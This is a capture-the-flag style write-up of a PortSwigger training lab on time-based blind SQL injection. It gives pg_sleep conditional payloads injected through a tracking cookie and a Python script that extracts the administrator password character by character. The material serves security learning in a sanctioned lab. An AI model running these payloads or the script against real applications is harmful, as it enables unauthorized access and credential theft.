# Lab13: Blind SQL injection with time delays and information retrieval
* url: `https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval`
* vulnerability: `Time-Based Blind SQL Injection`
* cheatsheet: `https://portswigger.net/web-security/sql-injection/cheat-sheet`


## Description 
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user. 

## Proof of Concept
1. Similar to the last lab, I am faced with a situation where I have to exploit the SQLi vulnerability of a web
application where the results of the query are not returned, the application does not respond any differently based 
on whether the query returns any rows or causes errors. So, I must test out the web application with a `time-based`
injection to see how it reacts: `'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--`. The web app 
takes approx. 10 seconds to send me a response, so I can assume that my initial payload worked. 
> Note that you must URL Encode the payload for it to work as intended!

2. Because my last payload worked, I can now start to tweak it so I can gather information from the database. The 
logic here is that I can alter my `condition` in my payload so that if the web app gives me a response that takes 
`10 seconds` I can assume that my condition is true. For instance: `'; SELECT CASE WHEN (SELECT 'a' FROM users WHERE username = 'administrator') = 'a' THEN pg_sleep(10) ELSE pg_sleep(0) END--`  
Because this payload caused the web application to give me a delayed (`10 seconds`) response, I can assume that 
both the `users` table and a username called `administrator` exists! 
3. Next, I will try to extract the length of the password for `administrator`. I can do this by altering my previous 
payload: `'; SELECT CASE WHEN (SELECT 'a' FROM users WHERE username = 'administrator' AND LENGTH(password)=1) = 'a' THEN pg_sleep(10) ELSE pg_sleep(0) END--`  
I can increment `LENGTH(password)=1` by 1 until I get a delayed response. 
> The password length is 20!

4. Next, I need to extract the exact `password` for `administrator`. `'; SELECT CASE WHEN (SELECT 'a' FROM users WHERE username = 'administrator' AND SUBSTRING(password, 1, 1)='x') = 'a' THEN pg_sleep(10) ELSE pg_sleep(0) END--`
I could use Burp Suite's `intruder`, however because I have the community (free) version, it would be faster for me to write a simple python script: 

```
import requests

# global variables 
url = "https://0a540009039055438250fb970087007e.web-security-academy.net/filter?category=Lifestyle"
characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
password = ""

for x in range(1, 21): 
    for c in characters:
        cookie = dict(TrackingId=f"p2Yocofrzuxzjn5M'%3b+SELECT+CASE+WHEN+(SELECT+'a'+FROM+users+WHERE+username+%3d+'administrator'+AND+SUBSTRING(password,{x},+1)%3d'{c}')+%3d+'a'+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--")
        r = requests.get(url, cookies=cookie)
        
        if r.elapsed.total_seconds() >= 10: 
            password += c
            print(f"Found {c} at index {x}")
            break

print(f"The password is: {password}")
```

5. From running my custom python script, I got the password value of `ab8gjbubf6uz1b79vaw6`. I can use the credentials of username: `administrator`, password: `ab8gjbubf6uz1b79vaw6` to log in and solve the lab!
